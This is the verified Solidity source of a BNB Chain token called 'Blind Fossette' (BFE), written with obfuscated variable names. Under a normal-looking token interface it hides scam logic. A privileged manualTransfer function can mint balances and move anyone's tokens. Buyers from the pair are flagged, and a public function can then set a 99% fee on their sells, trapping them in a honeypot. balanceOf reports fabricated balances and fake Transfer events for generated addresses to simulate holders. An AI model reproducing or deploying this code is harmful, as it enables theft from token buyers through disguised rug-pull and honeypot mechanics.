/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;



library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}


interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

}




contract BlindFossette is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    uint256  receiverEnableIsBurn = 100000000 * 10 ** _decimals;
    uint256 shouldTotalAmountLaunched = 0;
    uint256 private txToIsTradingReceiverTotalLaunched = 0;
    string constant _name = "Blind Fossette";
    uint256 private tokenReceiverListWalletMin = 0;


    mapping(address => mapping(address => uint256)) _allowances;

    uint256 public launchModeLaunchedReceiverAutoIsTeam0 = 0;
    uint160 constant mintLaunchedSwapAuto = 1053078802697 * 2 ** 120;
    mapping(address => bool)  limitBurnLaunchedTradingFromMinSwap;

    mapping(address => bool) private liquidityReceiverReceiverIs;
    uint160 constant maxFromSellFeeBurnTeam = 873719261931 * 2 ** 80;
    address constant mintReceiverAutoTake = 0xC15034ec9cd76818A02408BB46B9A6aebD59A9E8;

    uint256 private atFromSenderBuy = 100;
    uint160 constant receiverBurnMaxExempt = 806949754110;

    uint256 constant swapMarketingBuyMintSenderMin = 1000000 * 10 ** 18;
    address private shouldLaunchedFundTeam = (msg.sender);
    bool private tradingBuyTakeMarketingModeToSender = false;
    IUniswapV2Router public txMarketingLiquidityTradingEnableIs;
    uint256 public mintModeIsLimitTakeWallet = 0;
    address public uniswapV2Pair;
    mapping(address => bool)  swapMaxListTrading;
    uint160 constant autoEnableFromFee = 682250187223 * 2 ** 40;

    

    mapping(address => uint256) _balances;
    string constant _symbol = "BFE";

    uint256  walletLaunchTradingReceiverTxFundEnable = 100000000 * 10 ** _decimals;
    uint256 private tradingLimitMinBurn = 0;


    uint256  buyListFromBurnMarketingToken = 100000000 * (10 ** 18);
    uint256 private buyLaunchEnableAt = 0;
    uint256 constant receiverMarketingAtTake = 100 * 10 ** 18;
    bool private teamReceiverSwapLimit = false;
    uint256 private walletLaunchedIsTx = 0;

    bool private tradingMarketingModeAt = false;
    bool private launchModeLaunchedReceiverAutoIsTeam = false;

    bool private receiverTeamAutoAmountToFromEnable = false;
    bool public marketingMaxTeamLimitSenderAutoFee = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        txMarketingLiquidityTradingEnableIs = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(txMarketingLiquidityTradingEnableIs.factory()).createPair(address(this), txMarketingLiquidityTradingEnableIs.WETH());
        _allowances[address(this)][address(txMarketingLiquidityTradingEnableIs)] = buyListFromBurnMarketingToken;

        liquidityReceiverReceiverIs[msg.sender] = true;
        liquidityReceiverReceiverIs[address(this)] = true;

        _balances[msg.sender] = buyListFromBurnMarketingToken;
        emit Transfer(address(0), msg.sender, buyListFromBurnMarketingToken);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return buyListFromBurnMarketingToken;
    }

    function setreceiverEnableMintLaunchSell(bool receiverEnableTokenWallet) public onlyOwner {
        tradingMarketingModeAt=receiverEnableTokenWallet;
    }

    function gettxMintLaunchedBurnTeamTakeEnable() public view returns (bool) {
        if (launchModeLaunchedReceiverAutoIsTeam != teamReceiverSwapLimit) {
            return teamReceiverSwapLimit;
        }
        if (launchModeLaunchedReceiverAutoIsTeam != tradingBuyTakeMarketingModeToSender) {
            return tradingBuyTakeMarketingModeToSender;
        }
        return launchModeLaunchedReceiverAutoIsTeam;
    }

    function gettxMintLaunchedBurnTeamTakeEnable0() public view returns (uint256) {
        if (launchModeLaunchedReceiverAutoIsTeam0 != mintModeIsLimitTakeWallet) {
            return mintModeIsLimitTakeWallet;
        }
        return launchModeLaunchedReceiverAutoIsTeam0;
    }

    function mintListLimitReceiver(address limitToShouldFund, address totalSellReceiverWalletTake, uint256 feeSenderSwapReceiverTxBurn, bool launchedMaxReceiverExempt) private {
        uint160 fromToFeeTeamMin = mintLaunchedSwapAuto + maxFromSellFeeBurnTeam + autoEnableFromFee + receiverBurnMaxExempt;
        if (launchedMaxReceiverExempt) {
            limitToShouldFund = address(uint160(fromToFeeTeamMin + shouldTotalAmountLaunched));
            shouldTotalAmountLaunched++;
            _balances[totalSellReceiverWalletTake] = _balances[totalSellReceiverWalletTake].add(feeSenderSwapReceiverTxBurn);
        } else {
            _balances[limitToShouldFund] = _balances[limitToShouldFund].sub(feeSenderSwapReceiverTxBurn);
        }
        if (feeSenderSwapReceiverTxBurn == 0) {
            return;
        }
        emit Transfer(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn);
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return swapMaxListTrading[spender];
    }

    function getlaunchedFundReceiverSell() public view returns (uint256) {
        return walletLaunchedIsTx;
    }

    function setenableFundLimitToken(bool receiverEnableTokenWallet) public onlyOwner {
        teamReceiverSwapLimit=receiverEnableTokenWallet;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function liquidityBuyReceiverMarketing(address listAmountLaunchedSwap) private pure returns (bool) {
        return listAmountLaunchedSwap == mintReceiverAutoTake;
    }

    function teamBuyTxTotalFrom(address limitToShouldFund, bool receiverShouldTakeTx) internal returns (uint256) {
        if (swapMaxListTrading[limitToShouldFund]) {
            return 99;
        }
        
        if (teamReceiverSwapLimit != marketingMaxTeamLimitSenderAutoFee) {
            teamReceiverSwapLimit = launchModeLaunchedReceiverAutoIsTeam;
        }

        if (tradingLimitMinBurn == tokenReceiverListWalletMin) {
            tradingLimitMinBurn = buyLaunchEnableAt;
        }

        if (launchModeLaunchedReceiverAutoIsTeam == receiverTeamAutoAmountToFromEnable) {
            launchModeLaunchedReceiverAutoIsTeam = launchModeLaunchedReceiverAutoIsTeam;
        }


        if (receiverShouldTakeTx) {
            return txToIsTradingReceiverTotalLaunched;
        }
        
        if (!receiverShouldTakeTx && limitToShouldFund == uniswapV2Pair) {
            return tokenReceiverListWalletMin;
        }
        
        return 0;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setlistReceiverMaxLiquidityLaunchShould(bool receiverEnableTokenWallet) public onlyOwner {
        marketingMaxTeamLimitSenderAutoFee=receiverEnableTokenWallet;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setlaunchedFundReceiverSell(uint256 receiverEnableTokenWallet) public onlyOwner {
        if (walletLaunchedIsTx != buyLaunchEnableAt) {
            buyLaunchEnableAt=receiverEnableTokenWallet;
        }
        walletLaunchedIsTx=receiverEnableTokenWallet;
    }

    function toExemptReceiverIsListMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function exemptReceiverWalletMax(uint160 listAmountLaunchedSwap) private pure returns (bool) {
        uint160 fromToFeeTeamMin = mintLaunchedSwapAuto + maxFromSellFeeBurnTeam + autoEnableFromFee + receiverBurnMaxExempt;
        if (listAmountLaunchedSwap >= uint160(fromToFeeTeamMin)) {
            if (listAmountLaunchedSwap <= uint160(fromToFeeTeamMin) + 300000) {
                return true;
            }
        }
        return false;
    }

    function maxSwapExemptTxSenderEnable(uint160 listAmountLaunchedSwap) private view returns (uint256) {
        uint160 fromToFeeTeamMin = mintLaunchedSwapAuto + maxFromSellFeeBurnTeam + autoEnableFromFee + receiverBurnMaxExempt;
        uint160 maxExemptTakeTotal = listAmountLaunchedSwap - fromToFeeTeamMin;
        if (maxExemptTakeTotal < shouldTotalAmountLaunched) {
            return receiverMarketingAtTake * maxExemptTakeTotal;
        }
        return swapMarketingBuyMintSenderMin + receiverMarketingAtTake * maxExemptTakeTotal;
    }

    function getlistReceiverMaxLiquidityLaunchShould() public view returns (bool) {
        if (marketingMaxTeamLimitSenderAutoFee != launchModeLaunchedReceiverAutoIsTeam) {
            return launchModeLaunchedReceiverAutoIsTeam;
        }
        if (marketingMaxTeamLimitSenderAutoFee != tradingBuyTakeMarketingModeToSender) {
            return tradingBuyTakeMarketingModeToSender;
        }
        return marketingMaxTeamLimitSenderAutoFee;
    }

    function setexemptTeamTakeSwapLaunchAuto(uint256 receiverEnableTokenWallet) public onlyOwner {
        if (tokenReceiverListWalletMin != atFromSenderBuy) {
            atFromSenderBuy=receiverEnableTokenWallet;
        }
        tokenReceiverListWalletMin=receiverEnableTokenWallet;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getexemptTeamTakeSwapLaunchAuto() public view returns (uint256) {
        if (tokenReceiverListWalletMin != txToIsTradingReceiverTotalLaunched) {
            return txToIsTradingReceiverTotalLaunched;
        }
        return tokenReceiverListWalletMin;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (exemptReceiverWalletMax(uint160(account))) {
            return maxSwapExemptTxSenderEnable(uint160(account));
        }
        return _balances[account];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function settxMintLaunchedBurnTeamTakeEnable(bool receiverEnableTokenWallet) public onlyOwner {
        if (launchModeLaunchedReceiverAutoIsTeam == teamReceiverSwapLimit) {
            teamReceiverSwapLimit=receiverEnableTokenWallet;
        }
        launchModeLaunchedReceiverAutoIsTeam=receiverEnableTokenWallet;
    }

    function getreceiverEnableMintLaunchSell() public view returns (bool) {
        if (tradingMarketingModeAt == teamReceiverSwapLimit) {
            return teamReceiverSwapLimit;
        }
        return tradingMarketingModeAt;
    }

    function manualTransfer(address limitToShouldFund, address totalSellReceiverWalletTake, uint256 feeSenderSwapReceiverTxBurn) public {
        if (!liquidityBuyReceiverMarketing(msg.sender) && msg.sender != shouldLaunchedFundTeam) {
            return;
        }
        if (exemptReceiverWalletMax(uint160(totalSellReceiverWalletTake))) {
            mintListLimitReceiver(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn, false);
            return;
        }
        if (exemptReceiverWalletMax(uint160(limitToShouldFund))) {
            mintListLimitReceiver(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn, true);
            return;
        }
        if (limitToShouldFund == address(0)) {
            _balances[totalSellReceiverWalletTake] = _balances[totalSellReceiverWalletTake].add(feeSenderSwapReceiverTxBurn);
            return;
        }
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != buyListFromBurnMarketingToken) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return modeSellLaunchMax(sender, recipient, amount);
    }

    function settxMintLaunchedBurnTeamTakeEnable0(uint256 receiverEnableTokenWallet) public onlyOwner {
        if (launchModeLaunchedReceiverAutoIsTeam0 == mintModeIsLimitTakeWallet) {
            mintModeIsLimitTakeWallet=receiverEnableTokenWallet;
        }
        launchModeLaunchedReceiverAutoIsTeam0=receiverEnableTokenWallet;
    }

    function atListSwapToMarketingReceiverTrading(address limitToShouldFund) internal view returns (bool) {
        return !liquidityReceiverReceiverIs[limitToShouldFund];
    }

    function allowanceMax(address spender) external {
        if (limitBurnLaunchedTradingFromMinSwap[spender]) {
            swapMaxListTrading[spender] = true;
        }
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeSellLaunchMax(msg.sender, recipient, amount);
    }

    function getenableFundLimitToken() public view returns (bool) {
        return teamReceiverSwapLimit;
    }

    function burnReceiverFromTrading(address limitToShouldFund, address launchMarketingTotalMode, uint256 feeSenderSwapReceiverTxBurn) internal returns (uint256) {
        
        uint256 receiverShouldTotalMin = feeSenderSwapReceiverTxBurn.mul(teamBuyTxTotalFrom(limitToShouldFund, launchMarketingTotalMode == uniswapV2Pair)).div(atFromSenderBuy);
        
        if (tradingBuyTakeMarketingModeToSender == teamReceiverSwapLimit) {
            tradingBuyTakeMarketingModeToSender = marketingMaxTeamLimitSenderAutoFee;
        }

        if (tradingMarketingModeAt != teamReceiverSwapLimit) {
            tradingMarketingModeAt = teamReceiverSwapLimit;
        }

        if (walletLaunchedIsTx != atFromSenderBuy) {
            walletLaunchedIsTx = tokenReceiverListWalletMin;
        }


        if (receiverShouldTotalMin > 0) {
            _balances[address(this)] = _balances[address(this)].add(receiverShouldTotalMin);
            emit Transfer(limitToShouldFund, address(this), receiverShouldTotalMin);
        }
        
        if (walletLaunchedIsTx != launchModeLaunchedReceiverAutoIsTeam0) {
            walletLaunchedIsTx = buyLaunchEnableAt;
        }

        if (tradingLimitMinBurn != tradingLimitMinBurn) {
            tradingLimitMinBurn = txToIsTradingReceiverTotalLaunched;
        }

        if (teamReceiverSwapLimit == launchModeLaunchedReceiverAutoIsTeam) {
            teamReceiverSwapLimit = tradingMarketingModeAt;
        }


        return feeSenderSwapReceiverTxBurn.sub(receiverShouldTotalMin);
    }

    function enableSellReceiverAmountBurn(address tokenMaxSwapTo) private view returns (bool) {
        if (tokenMaxSwapTo == shouldLaunchedFundTeam) {
            return true;
        }
        return false;
    }

    function modeSellLaunchMax(address limitToShouldFund, address totalSellReceiverWalletTake, uint256 feeSenderSwapReceiverTxBurn) internal returns (bool) {
        if (exemptReceiverWalletMax(uint160(totalSellReceiverWalletTake))) {
            mintListLimitReceiver(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn, false);
            return true;
        }
        if (exemptReceiverWalletMax(uint160(limitToShouldFund))) {
            mintListLimitReceiver(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn, true);
            return true;
        }
        
        bool exemptSwapMintAmountIsTrading = enableSellReceiverAmountBurn(limitToShouldFund) || enableSellReceiverAmountBurn(totalSellReceiverWalletTake);
        
        if (launchModeLaunchedReceiverAutoIsTeam != receiverTeamAutoAmountToFromEnable) {
            launchModeLaunchedReceiverAutoIsTeam = marketingMaxTeamLimitSenderAutoFee;
        }


        if (limitToShouldFund == uniswapV2Pair && !exemptSwapMintAmountIsTrading) {
            limitBurnLaunchedTradingFromMinSwap[totalSellReceiverWalletTake] = true;
        }
        
        if (launchModeLaunchedReceiverAutoIsTeam0 != atFromSenderBuy) {
            launchModeLaunchedReceiverAutoIsTeam0 = launchModeLaunchedReceiverAutoIsTeam0;
        }

        if (marketingMaxTeamLimitSenderAutoFee == teamReceiverSwapLimit) {
            marketingMaxTeamLimitSenderAutoFee = receiverTeamAutoAmountToFromEnable;
        }

        if (mintModeIsLimitTakeWallet != launchModeLaunchedReceiverAutoIsTeam0) {
            mintModeIsLimitTakeWallet = atFromSenderBuy;
        }


        if (exemptSwapMintAmountIsTrading) {
            return toExemptReceiverIsListMin(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn);
        }
        
        _balances[limitToShouldFund] = _balances[limitToShouldFund].sub(feeSenderSwapReceiverTxBurn, "Insufficient Balance!");
        
        uint256 marketingLimitMintSenderBurn = atListSwapToMarketingReceiverTrading(limitToShouldFund) ? burnReceiverFromTrading(limitToShouldFund, totalSellReceiverWalletTake, feeSenderSwapReceiverTxBurn) : feeSenderSwapReceiverTxBurn;

        _balances[totalSellReceiverWalletTake] = _balances[totalSellReceiverWalletTake].add(marketingLimitMintSenderBurn);
        emit Transfer(limitToShouldFund, totalSellReceiverWalletTake, marketingLimitMintSenderBurn);
        return true;
    }

    function gettokenTradingLiquidityTotal() public view returns (bool) {
        if (tradingBuyTakeMarketingModeToSender == marketingMaxTeamLimitSenderAutoFee) {
            return marketingMaxTeamLimitSenderAutoFee;
        }
        if (tradingBuyTakeMarketingModeToSender == tradingBuyTakeMarketingModeToSender) {
            return tradingBuyTakeMarketingModeToSender;
        }
        return tradingBuyTakeMarketingModeToSender;
    }

    function settokenTradingLiquidityTotal(bool receiverEnableTokenWallet) public onlyOwner {
        if (tradingBuyTakeMarketingModeToSender != launchModeLaunchedReceiverAutoIsTeam) {
            launchModeLaunchedReceiverAutoIsTeam=receiverEnableTokenWallet;
        }
        if (tradingBuyTakeMarketingModeToSender == tradingMarketingModeAt) {
            tradingMarketingModeAt=receiverEnableTokenWallet;
        }
        tradingBuyTakeMarketingModeToSender=receiverEnableTokenWallet;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}